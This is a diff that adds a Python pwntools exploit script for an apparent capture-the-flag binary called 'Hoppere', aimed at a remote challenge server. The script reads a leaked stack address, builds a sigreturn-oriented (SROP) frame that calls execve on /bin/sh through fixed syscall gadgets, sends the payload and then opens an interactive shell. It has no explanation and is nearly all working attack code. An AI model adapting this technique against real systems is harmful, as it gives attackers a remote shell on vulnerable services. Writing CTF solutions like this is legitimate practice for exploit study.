@@ -1,0 +1,49 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+exe = ELF("./Hoppere")
+# context.log_level='debug'
+p = remote("pwn.1nf1n1ty.team", 31886)
+# p = process([exe.path])
+def gdbs():
+    context.terminal = ["foot"]
+    gdb.attach(p, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+# gdbs()
+p.recvuntil("    (\" ~----( ~   Y.  )")
+p.recvline()
+addr = u64(p.recv(8))
+log.info(f"addr: {hex(addr)}")
+context.arch = 'amd64'
+syscall = 0x000000000040100a
+bin_sh = addr+0xf8
+frame = SigreturnFrame()
+frame.rax = 0x3b
+frame.rdi = bin_sh
+frame.rbp = addr
+frame.rip = syscall
+sa(">>",p64(0x0000000000401069)*2+p64(syscall)+flat(frame)+b"/bin/sh\0")
+input("enter to continue->")
+s(p64(0x0000000000401013)+p64(0x0000000000401013)[:-1])
+
+
+
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
